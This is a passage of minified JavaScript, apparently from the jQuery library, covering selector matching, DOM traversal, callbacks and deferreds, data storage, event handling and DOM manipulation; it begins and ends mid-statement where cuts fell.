n,r=[],i=[],o=X[e+" "];if(!o){for(t||(t=k(e)),n=t.length;n--;)o=y(t[n]),o[W]?r.push(o):i.push(o);o=X(e,x(i,r)),o.selector=e}return o},S=t.select=function(e,t,n,r){var i,o,s,a,u,l="function"==typeof e&&e,f=!r&&k(e=l.selector||e);if(n=n||[],1===f.length){if(o=f[0]=f[0].slice(0),o.length>2&&"ID"===(s=o[0]).type&&w.getById&&9===t.nodeType&&O&&T.relative[o[1].type]){if(t=(T.find.ID(s.matches[0].replace(we,Te),t)||[])[0],!t)return n;l&&(t=t.parentNode),e=e.slice(o.shift().value.length)}for(i=he.needsContext.test(e)?0:o.length;i--&&(s=o[i],!T.relative[a=s.type]);)if((u=T.find[a])&&(r=u(s.matches[0].replace(we,Te),xe.test(o[0].type)&&c(t.parentNode)||t))){if(o.splice(i,1),e=r.length&&p(o),!e)return K.apply(n,r),n;break}}return(l||E(e,f))(r,t,!O,n,xe.test(e)&&c(t.parentNode)||t),n},w.sortStable=W.split("").sort(U).join("")===W,w.detectDuplicates=!!A,L(),w.sortDetached=i(function(e){return 1&e.compareDocumentPosition(q.createElement("div"))}),i(function(e){return e.innerHTML="<a href='#'></a>","#"===e.firstChild.getAttribute("href")})||o("type|href|height|width",function(e,t,n){return n?void 0:e.getAttribute(t,"type"===t.toLowerCase()?1:2)}),w.attributes&&i(function(e){return e.innerHTML="<input/>",e.firstChild.setAttribute("value",""),""===e.firstChild.getAttribute("value")})||o("value",function(e,t,n){return n||"input"!==e.nodeName.toLowerCase()?void 0:e.defaultValue}),i(function(e){return null==e.getAttribute("disabled")})||o(te,function(e,t,n){var r;return n?void 0:e[t]===!0?t.toLowerCase():(r=e.getAttributeNode(t))&&r.specified?r.value:null}),t}(e);Z.find=ie,Z.expr=ie.selectors,Z.expr[":"]=Z.expr.pseudos,Z.unique=ie.uniqueSort,Z.text=ie.getText,Z.isXMLDoc=ie.isXML,Z.contains=ie.contains;var oe=Z.expr.match.needsContext,se=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,ae=/^.[^:#\[\.,]*$/;Z.filter=function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?Z.find.matchesSelector(r,e)?[r]:[]:Z.find.matches(e,Z.grep(t,function(e){return 1===e.nodeType}))},Z.fn.extend({find:function(e){var t,n=this.length,r=[],i=this;
if("string"!=typeof e)return this.pushStack(Z(e).filter(function(){for(t=0;n>t;t++)if(Z.contains(i[t],this))return!0}));for(t=0;n>t;t++)Z.find(e,i[t],r);return r=this.pushStack(n>1?Z.unique(r):r),r.selector=this.selector?this.selector+" "+e:e,r},filter:function(e){return this.pushStack(r(this,e||[],!1))},not:function(e){return this.pushStack(r(this,e||[],!0))},is:function(e){return!!r(this,"string"==typeof e&&oe.test(e)?Z(e):e||[],!1).length}});var ue,le=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,ce=Z.fn.init=function(e,t){var n,r;if(!e)return this;if("string"==typeof e){if(n="<"===e[0]&&">"===e[e.length-1]&&e.length>=3?[null,e,null]:le.exec(e),!n||!n[1]&&t)return!t||t.jquery?(t||ue).find(e):this.constructor(t).find(e);if(n[1]){if(t=t instanceof Z?t[0]:t,Z.merge(this,Z.parseHTML(n[1],t&&t.nodeType?t.ownerDocument||t:J,!0)),se.test(n[1])&&Z.isPlainObject(t))for(n in t)Z.isFunction(this[n])?this[n](t[n]):this.attr(n,t[n]);return this}return r=J.getElementById(n[2]),r&&r.parentNode&&(this.length=1,this[0]=r),this.context=J,this.selector=e,this}return e.nodeType?(this.context=this[0]=e,this.length=1,this):Z.isFunction(e)?"undefined"!=typeof ue.ready?ue.ready(e):e(Z):(void 0!==e.selector&&(this.selector=e.selector,this.context=e.context),Z.makeArray(e,this))};ce.prototype=Z.fn,ue=Z(J);var fe=/^(?:parents|prev(?:Until|All))/,pe={children:!0,contents:!0,next:!0,prev:!0};Z.extend({dir:function(e,t,n){for(var r=[],i=void 0!==n;(e=e[t])&&9!==e.nodeType;)if(1===e.nodeType){if(i&&Z(e).is(n))break;r.push(e)}return r},sibling:function(e,t){for(var n=[];e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n}}),Z.fn.extend({has:function(e){var t=Z(e,this),n=t.length;return this.filter(function(){for(var e=0;n>e;e++)if(Z.contains(this,t[e]))return!0})},closest:function(e,t){for(var n,r=0,i=this.length,o=[],s=oe.test(e)||"string"!=typeof e?Z(e,t||this.context):0;i>r;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(n.nodeType<11&&(s?s.index(n)>-1:1===n.nodeType&&Z.find.matchesSelector(n,e))){o.push(n);break}return this.pushStack(o.length>1?Z.unique(o):o)},index:function(e){return e?"string"==typeof e?U.call(Z(e),this[0]):U.call(this,e.jquery?e[0]:e):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){return this.pushStack(Z.unique(Z.merge(this.get(),Z(e,t))))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}}),Z.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return Z.dir(e,"parentNode")},parentsUntil:function(e,t,n){return Z.dir(e,"parentNode",n)},next:function(e){return i(e,"nextSibling")},prev:function(e){return i(e,"previousSibling")},nextAll:function(e){return Z.dir(e,"nextSibling")},prevAll:function(e){return Z.dir(e,"previousSibling")},nextUntil:function(e,t,n){return Z.dir(e,"nextSibling",n)},prevUntil:function(e,t,n){return Z.dir(e,"previousSibling",n)},siblings:function(e){return Z.sibling((e.parentNode||{}).firstChild,e)},children:function(e){return Z.sibling(e.firstChild)},contents:function(e){return e.contentDocument||Z.merge([],e.childNodes)}},function(e,t){Z.fn[e]=function(n,r){var i=Z.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=Z.filter(r,i)),this.length>1&&(pe[e]||Z.unique(i),fe.test(e)&&i.reverse()),this.pushStack(i)}});var de=/\S+/g,he={};Z.Callbacks=function(e){e="string"==typeof e?he[e]||o(e):Z.extend({},e);var t,n,r,i,s,a,u=[],l=!e.once&&[],c=function(o){for(t=e.memory&&o,n=!0,a=i||0,i=0,s=u.length,r=!0;u&&s>a;a++)if(u[a].apply(o[0],o[1])===!1&&e.stopOnFalse){t=!1;break}r=!1,u&&(l?l.length&&c(l.shift()):t?u=[]:f.disable())},f={add:function(){if(u){var n=u.length;!function o(t){Z.each(t,function(t,n){var r=Z.type(n);"function"===r?e.unique&&f.has(n)||u.push(n):n&&n.length&&"string"!==r&&o(n)})}(arguments),r?s=u.length:t&&(i=n,c(t))}return this},remove:function(){return u&&Z.each(arguments,function(e,t){for(var n;(n=Z.inArray(t,u,n))>-1;)u.splice(n,1),r&&(s>=n&&s--,a>=n&&a--)}),this},has:function(e){return e?Z.inArray(e,u)>-1:!(!u||!u.length)},empty:function(){return u=[],s=0,this},disable:function(){return u=l=t=void 0,this},disabled:function(){return!u},lock:function(){return l=void 0,t||f.disable(),this},locked:function(){return!l},fireWith:function(e,t){return!u||n&&!l||(t=t||[],t=[e,t.slice?t.slice():t],r?l.push(t):c(t)),this},fire:function(){return f.fireWith(this,arguments),this},fired:function(){return!!n}};return f},Z.extend({Deferred:function(e){var t=[["resolve","done",Z.Callbacks("once memory"),"resolved"],["reject","fail",Z.Callbacks("once memory"),"rejected"],["notify","progress",Z.Callbacks("memory")]],n="pending",r={state:function(){return n},always:function(){return i.done(arguments).fail(arguments),this},then:function(){var e=arguments;return Z.Deferred(function(n){Z.each(t,function(t,o){var s=Z.isFunction(e[t])&&e[t];i[o[1]](function(){var e=s&&s.apply(this,arguments);e&&Z.isFunction(e.promise)?e.promise().done(n.resolve).fail(n.reject).progress(n.notify):n[o[0]+"With"](this===r?n.promise():this,s?[e]:arguments)})}),e=null}).promise()},promise:function(e){return null!=e?Z.extend(e,r):r}},i={};return r.pipe=r.then,Z.each(t,function(e,o){var s=o[2],a=o[3];r[o[1]]=s.add,a&&s.add(function(){n=a},t[1^e][2].disable,t[2][2].lock),i[o[0]]=function(){return i[o[0]+"With"](this===i?r:this,arguments),this},i[o[0]+"With"]=s.fireWith}),r.promise(i),e&&e.call(i,i),i},when:function(e){var t,n,r,i=0,o=_.call(arguments),s=o.length,a=1!==s||e&&Z.isFunction(e.promise)?s:0,u=1===a?e:Z.Deferred(),l=function(e,n,r){return function(i){n[e]=this,r[e]=arguments.length>1?_.call(arguments):i,r===t?u.notifyWith(n,r):--a||u.resolveWith(n,r)}};if(s>1)for(t=new Array(s),n=new Array(s),r=new Array(s);s>i;i++)o[i]&&Z.isFunction(o[i].promise)?o[i].promise().done(l(i,r,o)).fail(u.reject).progress(l(i,n,t)):--a;return a||u.resolveWith(r,o),u.promise()}});var ge;Z.fn.ready=function(e){return Z.ready.promise().done(e),this},Z.extend({isReady:!1,readyWait:1,holdReady:function(e){e?Z.readyWait++:Z.ready(!0)},ready:function(e){(e===!0?--Z.readyWait:Z.isReady)||(Z.isReady=!0,e!==!0&&--Z.readyWait>0||(ge.resolveWith(J,[Z]),Z.fn.triggerHandler&&(Z(J).triggerHandler("ready"),Z(J).off("ready"))))}}),Z.ready.promise=function(t){return ge||(ge=Z.Deferred(),"complete"===J.readyState?setTimeout(Z.ready):(J.addEventListener("DOMContentLoaded",s,!1),e.addEventListener("load",s,!1))),ge.promise(t)},Z.ready.promise();var me=Z.access=function(e,t,n,r,i,o,s){var a=0,u=e.length,l=null==n;if("object"===Z.type(n)){i=!0;for(a in n)Z.access(e,t,a,n[a],!0,o,s)}else if(void 0!==r&&(i=!0,Z.isFunction(r)||(s=!0),l&&(s?(t.call(e,r),t=null):(l=t,t=function(e,t,n){return l.call(Z(e),n)})),t))for(;u>a;a++)t(e[a],n,s?r:r.call(e[a],a,t(e[a],n)));return i?e:l?t.call(e):u?t(e[0],n):o};Z.acceptData=function(e){return 1===e.nodeType||9===e.nodeType||!+e.nodeType},a.uid=1,a.accepts=Z.acceptData,a.prototype={key:function(e){if(!a.accepts(e))return 0;var t={},n=e[this.expando];if(!n){n=a.uid++;try{t[this.expando]={value:n},Object.defineProperties(e,t)}catch(r){t[this.expando]=n,Z.extend(e,t)}}return this.cache[n]||(this.cache[n]={}),n},set:function(e,t,n){var r,i=this.key(e),o=this.cache[i];if("string"==typeof t)o[t]=n;else if(Z.isEmptyObject(o))Z.extend(this.cache[i],t);else for(r in t)o[r]=t[r];return o},get:function(e,t){var n=this.cache[this.key(e)];return void 0===t?n:n[t]},access:function(e,t,n){var r;return void 0===t||t&&"string"==typeof t&&void 0===n?(r=this.get(e,t),void 0!==r?r:this.get(e,Z.camelCase(t))):(this.set(e,t,n),void 0!==n?n:t)},remove:function(e,t){var n,r,i,o=this.key(e),s=this.cache[o];if(void 0===t)this.cache[o]={};else{Z.isArray(t)?r=t.concat(t.map(Z.camelCase)):(i=Z.camelCase(t),t in s?r=[t,i]:(r=i,r=r in s?[r]:r.match(de)||[])),n=r.length;for(;n--;)delete s[r[n]]}},hasData:function(e){return!Z.isEmptyObject(this.cache[e[this.expando]]||{})},discard:function(e){e[this.expando]&&delete this.cache[e[this.expando]]}};var ve=new a,ye=new a,xe=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,be=/([A-Z])/g;Z.extend({hasData:function(e){return ye.hasData(e)||ve.hasData(e)},data:function(e,t,n){return ye.access(e,t,n)},removeData:function(e,t){ye.remove(e,t)},_data:function(e,t,n){return ve.access(e,t,n)},_removeData:function(e,t){ve.remove(e,t)}}),Z.fn.extend({data:function(e,t){var n,r,i,o=this[0],s=o&&o.attributes;if(void 0===e){if(this.length&&(i=ye.get(o),1===o.nodeType&&!ve.get(o,"hasDataAttrs"))){for(n=s.length;n--;)s[n]&&(r=s[n].name,0===r.indexOf("data-")&&(r=Z.camelCase(r.slice(5)),u(o,r,i[r])));ve.set(o,"hasDataAttrs",!0)}return i}return"object"==typeof e?this.each(function(){ye.set(this,e)}):me(this,function(t){var n,r=Z.camelCase(e);if(o&&void 0===t){if(n=ye.get(o,e),void 0!==n)return n;if(n=ye.get(o,r),void 0!==n)return n;if(n=u(o,r,void 0),void 0!==n)return n}else this.each(function(){var n=ye.get(this,r);ye.set(this,r,t),-1!==e.indexOf("-")&&void 0!==n&&ye.set(this,e,t)})},null,t,arguments.length>1,null,!0)},removeData:function(e){return this.each(function(){ye.remove(this,e)})}}),Z.extend({queue:function(e,t,n){var r;return e?(t=(t||"fx")+"queue",r=ve.get(e,t),n&&(!r||Z.isArray(n)?r=ve.access(e,t,Z.makeArray(n)):r.push(n)),r||[]):void 0},dequeue:function(e,t){t=t||"fx";var n=Z.queue(e,t),r=n.length,i=n.shift(),o=Z._queueHooks(e,t),s=function(){Z.dequeue(e,t)};"inprogress"===i&&(i=n.shift(),r--),i&&("fx"===t&&n.unshift("inprogress"),delete o.stop,i.call(e,s,o)),!r&&o&&o.empty.fire()},_queueHooks:function(e,t){var n=t+"queueHooks";return ve.get(e,n)||ve.access(e,n,{empty:Z.Callbacks("once memory").add(function(){ve.remove(e,[t+"queue",n])})})}}),Z.fn.extend({queue:function(e,t){var n=2;return"string"!=typeof e&&(t=e,e="fx",n--),arguments.length<n?Z.queue(this[0],e):void 0===t?this:this.each(function(){var n=Z.queue(this,e,t);Z._queueHooks(this,e),"fx"===e&&"inprogress"!==n[0]&&Z.dequeue(this,e)})},dequeue:function(e){return this.each(function(){Z.dequeue(this,e)})},clearQueue:function(e){return this.queue(e||"fx",[])},promise:function(e,t){var n,r=1,i=Z.Deferred(),o=this,s=this.length,a=function(){--r||i.resolveWith(o,[o])};for("string"!=typeof e&&(t=e,e=void 0),e=e||"fx";s--;)n=ve.get(o[s],e+"queueHooks"),n&&n.empty&&(r++,n.empty.add(a));return a(),i.promise(t)}});var we=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,Te=["Top","Right","Bottom","Left"],Ce=function(e,t){return e=t||e,"none"===Z.css(e,"display")||!Z.contains(e.ownerDocument,e)},Ne=/^(?:checkbox|radio)$/i;!function(){var e=J.createDocumentFragment(),t=e.appendChild(J.createElement("div")),n=J.createElement("input");n.setAttribute("type","radio"),n.setAttribute("checked","checked"),n.setAttribute("name","t"),t.appendChild(n),Q.checkClone=t.cloneNode(!0).cloneNode(!0).lastChild.checked,t.innerHTML="<textarea>x</textarea>",Q.noCloneChecked=!!t.cloneNode(!0).lastChild.defaultValue}();var ke="undefined";Q.focusinBubbles="onfocusin"in e;var Ee=/^key/,Se=/^(?:mouse|pointer|contextmenu)|click/,De=/^(?:focusinfocus|focusoutblur)$/,je=/^([^.]*)(?:\.(.+)|)$/;Z.event={global:{},add:function(e,t,n,r,i){var o,s,a,u,l,c,f,p,d,h,g,m=ve.get(e);if(m)for(n.handler&&(o=n,n=o.handler,i=o.selector),n.guid||(n.guid=Z.guid++),(u=m.events)||(u=m.events={}),(s=m.handle)||(s=m.handle=function(t){return typeof Z!==ke&&Z.event.triggered!==t.type?Z.event.dispatch.apply(e,arguments):void 0}),t=(t||"").match(de)||[""],l=t.length;l--;)a=je.exec(t[l])||[],d=g=a[1],h=(a[2]||"").split(".").sort(),d&&(f=Z.event.special[d]||{},d=(i?f.delegateType:f.bindType)||d,f=Z.event.special[d]||{},c=Z.extend({type:d,origType:g,data:r,handler:n,guid:n.guid,selector:i,needsContext:i&&Z.expr.match.needsContext.test(i),namespace:h.join(".")},o),(p=u[d])||(p=u[d]=[],p.delegateCount=0,f.setup&&f.setup.call(e,r,h,s)!==!1||e.addEventListener&&e.addEventListener(d,s,!1)),f.add&&(f.add.call(e,c),c.handler.guid||(c.handler.guid=n.guid)),i?p.splice(p.delegateCount++,0,c):p.push(c),Z.event.global[d]=!0)},remove:function(e,t,n,r,i){var o,s,a,u,l,c,f,p,d,h,g,m=ve.hasData(e)&&ve.get(e);if(m&&(u=m.events)){for(t=(t||"").match(de)||[""],l=t.length;l--;)if(a=je.exec(t[l])||[],d=g=a[1],h=(a[2]||"").split(".").sort(),d){for(f=Z.event.special[d]||{},d=(r?f.delegateType:f.bindType)||d,p=u[d]||[],a=a[2]&&new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"),s=o=p.length;o--;)c=p[o],!i&&g!==c.origType||n&&n.guid!==c.guid||a&&!a.test(c.namespace)||r&&r!==c.selector&&("**"!==r||!c.selector)||(p.splice(o,1),c.selector&&p.delegateCount--,f.remove&&f.remove.call(e,c));s&&!p.length&&(f.teardown&&f.teardown.call(e,h,m.handle)!==!1||Z.removeEvent(e,d,m.handle),delete u[d])}else for(d in u)Z.event.remove(e,d+t[l],n,r,!0);Z.isEmptyObject(u)&&(delete m.handle,ve.remove(e,"events"))}},trigger:function(t,n,r,i){var o,s,a,u,l,c,f,p=[r||J],d=G.call(t,"type")?t.type:t,h=G.call(t,"namespace")?t.namespace.split("."):[];if(s=a=r=r||J,3!==r.nodeType&&8!==r.nodeType&&!De.test(d+Z.event.triggered)&&(d.indexOf(".")>=0&&(h=d.split("."),d=h.shift(),h.sort()),l=d.indexOf(":")<0&&"on"+d,t=t[Z.expando]?t:new Z.Event(d,"object"==typeof t&&t),t.isTrigger=i?2:3,t.namespace=h.join("."),t.namespace_re=t.namespace?new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,t.result=void 0,t.target||(t.target=r),n=null==n?[t]:Z.makeArray(n,[t]),f=Z.event.special[d]||{},i||!f.trigger||f.trigger.apply(r,n)!==!1)){if(!i&&!f.noBubble&&!Z.isWindow(r)){for(u=f.delegateType||d,De.test(u+d)||(s=s.parentNode);s;s=s.parentNode)p.push(s),a=s;a===(r.ownerDocument||J)&&p.push(a.defaultView||a.parentWindow||e)}for(o=0;(s=p[o++])&&!t.isPropagationStopped();)t.type=o>1?u:f.bindType||d,c=(ve.get(s,"events")||{})[t.type]&&ve.get(s,"handle"),c&&c.apply(s,n),c=l&&s[l],c&&c.apply&&Z.acceptData(s)&&(t.result=c.apply(s,n),t.result===!1&&t.preventDefault());return t.type=d,i||t.isDefaultPrevented()||f._default&&f._default.apply(p.pop(),n)!==!1||!Z.acceptData(r)||l&&Z.isFunction(r[d])&&!Z.isWindow(r)&&(a=r[l],a&&(r[l]=null),Z.event.triggered=d,r[d](),Z.event.triggered=void 0,a&&(r[l]=a)),t.result}},dispatch:function(e){e=Z.event.fix(e);var t,n,r,i,o,s=[],a=_.call(arguments),u=(ve.get(this,"events")||{})[e.type]||[],l=Z.event.special[e.type]||{};if(a[0]=e,e.delegateTarget=this,!l.preDispatch||l.preDispatch.call(this,e)!==!1){for(s=Z.event.handlers.call(this,e,u),t=0;(i=s[t++])&&!e.isPropagationStopped();)for(e.currentTarget=i.elem,n=0;(o=i.handlers[n++])&&!e.isImmediatePropagationStopped();)(!e.namespace_re||e.namespace_re.test(o.namespace))&&(e.handleObj=o,e.data=o.data,r=((Z.event.special[o.origType]||{}).handle||o.handler).apply(i.elem,a),void 0!==r&&(e.result=r)===!1&&(e.preventDefault(),e.stopPropagation()));return l.postDispatch&&l.postDispatch.call(this,e),e.result}},handlers:function(e,t){var n,r,i,o,s=[],a=t.delegateCount,u=e.target;if(a&&u.nodeType&&(!e.button||"click"!==e.type))for(;u!==this;u=u.parentNode||this)if(u.disabled!==!0||"click"!==e.type){for(r=[],n=0;a>n;n++)o=t[n],i=o.selector+" ",void 0===r[i]&&(r[i]=o.needsContext?Z(i,this).index(u)>=0:Z.find(i,this,null,[u]).length),r[i]&&r.push(o);r.length&&s.push({elem:u,handlers:r})}return a<t.length&&s.push({elem:this,handlers:t.slice(a)}),s},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(e,t){return null==e.which&&(e.which=null!=t.charCode?t.charCode:t.keyCode),e}},mouseHooks:{props:"button buttons clientX clientY offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(e,t){var n,r,i,o=t.button;return null==e.pageX&&null!=t.clientX&&(n=e.target.ownerDocument||J,r=n.documentElement,i=n.body,e.pageX=t.clientX+(r&&r.scrollLeft||i&&i.scrollLeft||0)-(r&&r.clientLeft||i&&i.clientLeft||0),e.pageY=t.clientY+(r&&r.scrollTop||i&&i.scrollTop||0)-(r&&r.clientTop||i&&i.clientTop||0)),e.which||void 0===o||(e.which=1&o?1:2&o?3:4&o?2:0),e}},fix:function(e){if(e[Z.expando])return e;var t,n,r,i=e.type,o=e,s=this.fixHooks[i];for(s||(this.fixHooks[i]=s=Se.test(i)?this.mouseHooks:Ee.test(i)?this.keyHooks:{}),r=s.props?this.props.concat(s.props):this.props,e=new Z.Event(o),t=r.length;t--;)n=r[t],e[n]=o[n];return e.target||(e.target=J),3===e.target.nodeType&&(e.target=e.target.parentNode),s.filter?s.filter(e,o):e},special:{load:{noBubble:!0},focus:{trigger:function(){return this!==f()&&this.focus?(this.focus(),!1):void 0},delegateType:"focusin"},blur:{trigger:function(){return this===f()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return"checkbox"===this.type&&this.click&&Z.nodeName(this,"input")?(this.click(),!1):void 0},_default:function(e){return Z.nodeName(e.target,"a")}},beforeunload:{postDispatch:function(e){void 0!==e.result&&e.originalEvent&&(e.originalEvent.returnValue=e.result)}}},simulate:function(e,t,n,r){var i=Z.extend(new Z.Event,n,{type:e,isSimulated:!0,originalEvent:{}});r?Z.event.trigger(i,null,t):Z.event.dispatch.call(t,i),i.isDefaultPrevented()&&n.preventDefault()}},Z.removeEvent=function(e,t,n){e.removeEventListener&&e.removeEventListener(t,n,!1)},Z.Event=function(e,t){return this instanceof Z.Event?(e&&e.type?(this.originalEvent=e,this.type=e.type,this.isDefaultPrevented=e.defaultPrevented||void 0===e.defaultPrevented&&e.returnValue===!1?l:c):this.type=e,t&&Z.extend(this,t),this.timeStamp=e&&e.timeStamp||Z.now(),void(this[Z.expando]=!0)):new Z.Event(e,t)},Z.Event.prototype={isDefaultPrevented:c,isPropagationStopped:c,isImmediatePropagationStopped:c,preventDefault:function(){var e=this.originalEvent;this.isDefaultPrevented=l,e&&e.preventDefault&&e.preventDefault()},stopPropagation:function(){var e=this.originalEvent;this.isPropagationStopped=l,e&&e.stopPropagation&&e.stopPropagation()},stopImmediatePropagation:function(){var e=this.originalEvent;this.isImmediatePropagationStopped=l,e&&e.stopImmediatePropagation&&e.stopImmediatePropagation(),this.stopPropagation()}},Z.each({mouseenter:"mouseover",mouseleave:"mouseout",pointerenter:"pointerover",pointerleave:"pointerout"},function(e,t){Z.event.special[e]={delegateType:t,bindType:t,handle:function(e){var n,r=this,i=e.relatedTarget,o=e.handleObj;return(!i||i!==r&&!Z.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),Q.focusinBubbles||Z.each({focus:"focusin",blur:"focusout"},function(e,t){var n=function(e){Z.event.simulate(t,e.target,Z.event.fix(e),!0)};Z.event.special[t]={setup:function(){var r=this.ownerDocument||this,i=ve.access(r,t);i||r.addEventListener(e,n,!0),ve.access(r,t,(i||0)+1)},teardown:function(){var r=this.ownerDocument||this,i=ve.access(r,t)-1;i?ve.access(r,t,i):(r.removeEventListener(e,n,!0),ve.remove(r,t))}}}),Z.fn.extend({on:function(e,t,n,r,i){var o,s;if("object"==typeof e){"string"!=typeof t&&(n=n||t,t=void 0);for(s in e)this.on(s,t,n,e[s],i);return this}if(null==n&&null==r?(r=t,n=t=void 0):null==r&&("string"==typeof t?(r=n,n=void 0):(r=n,n=t,t=void 0)),r===!1)r=c;else if(!r)return this;return 1===i&&(o=r,r=function(e){return Z().off(e),o.apply(this,arguments)},r.guid=o.guid||(o.guid=Z.guid++)),this.each(function(){Z.event.add(this,e,r,n,t)})},one:function(e,t,n,r){return this.on(e,t,n,r,1)},off:function(e,t,n){var r,i;if(e&&e.preventDefault&&e.handleObj)return r=e.handleObj,Z(e.delegateTarget).off(r.namespace?r.origType+"."+r.namespace:r.origType,r.selector,r.handler),this;if("object"==typeof e){for(i in e)this.off(i,t,e[i]);return this}return(t===!1||"function"==typeof t)&&(n=t,t=void 0),n===!1&&(n=c),this.each(function(){Z.event.remove(this,e,n,t)})},trigger:function(e,t){return this.each(function(){Z.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];return n?Z.event.trigger(e,t,n,!0):void 0}});var Ae=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,Le=/<([\w:]+)/,qe=/<|&#?\w+;/,He=/<(?:script|style|link)/i,Oe=/checked\s*(?:[^=]|=\s*.checked.)/i,Fe=/^$|\/(?:java|ecma)script/i,Pe=/^true\/(.*)/,Re=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,Me={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],col:[2,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:[0,"",""]};Me.optgroup=Me.option,Me.tbody=Me.tfoot=Me.colgroup=Me.caption=Me.thead,Me.th=Me.td,Z.extend({clone:function(e,t,n){var r,i,o,s,a=e.cloneNode(!0),u=Z.contains(e.ownerDocument,e);if(!(Q.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||Z.isXMLDoc(e)))for(s=v(a),o=v(e),r=0,i=o.length;i>r;r++)y(o[r],s[r]);if(t)if(n)for(o=o||v(e),s=s||v(a),r=0,i=o.length;i>r;r++)m(o[r],s[r]);else m(e,a);return s=v(a,"script"),s.length>0&&g(s,!u&&v(e,"script")),a},buildFragment:function(e,t,n,r){for(var i,o,s,a,u,l,c=t.createDocumentFragment(),f=[],p=0,d=e.length;d>p;p++)if(i=e[p],i||0===i)if("object"===Z.type(i))Z.merge(f,i.nodeType?[i]:i);else if(qe.test(i)){for(o=o||c.appendChild(t.createElement("div")),s=(Le.exec(i)||["",""])[1].toLowerCase(),a=Me[s]||Me._default,o.innerHTML=a[1]+i.replace(Ae,"<$1></$2>")+a[2],l=a[0];l--;)o=o.lastChild;Z.merge(f,o.childNodes),o=c.firstChild,o.textContent=""}else f.push(t.createTextNode(i));for(c.textContent="",p=0;i=f[p++];)if((!r||-1===Z.inArray(i,r))&&(u=Z.contains(i.ownerDocument,i),o=v(c.appendChild(i),"script"),u&&g(o),n))for(l=0;i=o[l++];)Fe.test(i.type||"")&&n.push(i);return c},cleanData:function(e){for(var t,n,r,i,o=Z.event.special,s=0;void 0!==(n=e[s]);s++){if(Z.acceptData(n)&&(i=n[ve.expando],i&&(t=ve.cache[i]))){if(t.events)for(r in t.events)o[r]?Z.event.remove(n,r):Z.removeEvent(n,r,t.handle);ve.cache[i]&&delete ve.cache[i]}delete ye.cache[n[ye.expando]]}}}),Z.fn.extend({text:function(e){return me(this,function(e){return void 0===e?Z.text(this):this.empty().each(function(){(1===this.nodeType||11===this.nodeType||9===this.nodeType)&&(this.textContent=e)})},null,e,arguments.length)},append:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=p(this,e);t.appendChild(e)}})},prepend:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=p(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},remove:function(e,t){for(var n,r=e?Z.filter(e,this):this,i=0;null!=(n=r[i]);i++)t||1!==n.nodeType||Z.cleanData(v(n)),n.parentNode&&(t&&Z.contains(n.ownerDocument,n)&&g(v(n,"script")),n.parentNode.removeChild(n));return this},empty:function(){for(var e,t=0;null!=(e=this[t]);t++)1===e.nodeType&&(Z.cleanData(v(e,!1)),e.textContent="");return this},clone:function(e,t){return e=null==e?!1:e,t=null==t?e:t,this.map(function(){return Z.clone(this,e,t)})},html:function(e){return me(this,function(e){var t=this[0]||{},n=0,r=this.length;if(void 0===e&&1===t.nodeType)return t.innerHTML;if("string"==typeof e&&!He.test(e)&&!Me[(Le.exec(e)||["",""])[1].toLowerCase()]){e=e.replace(Ae,"<$1></$2>");try{for(;r>n;n++)t=this[n]||{},1===t.nodeType&&(Z.cleanData(v(t,!1)),t.innerHTML=e);t=0}catch(i){}}t&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=arguments[0];return this.domManip(arguments,function(t){e=this.parentNode,Z.cleanData(v(this)),e&&e.replaceChild(t,this)}),e&&(e.length||e.nodeType)?this:this.remove()},detach:function(e){return this.remove(e,!0)},domManip:function(e,t){e=z.apply([],e);var n,r,i,o,s,a,u=0,l=this.length,c=this,f=l-1,p=e[0],g=Z.isFunction(p);if(g||l>1&&"string"==typeof p&&!Q.checkClone&&Oe.test(p))return this.each(function(n){var r=c.eq(n);g&&(e[0]=p.call(this,n,r.html())),r.domManip(e,t)});if(l&&(n=Z.buildFragment(e,this[0].ownerDocument,!1,this),r=n.firstChild,1===n.childNodes.length&&(n=r),r)){for(i=Z.map(v(n,"script"),d),o=i.length;l>u;u++)s=n,u!==f&&(s=Z.clone(s,!0,!0),o&&Z.merge(i,v(s,"script"))),t.call(this[u],s,u);if(o)for(a=i[i.length-1].ownerDocument,Z.map(i,h),u=0;o>u;u++)s=i[u],Fe.test(s.type||"")&&!ve.access(s,"globalEval")&&Z.contains(a,s)&&(s.src?Z._evalUrl&&Z._evalUrl(s.src):Z.globalEval(s.textContent.replace(Re,"")))}return 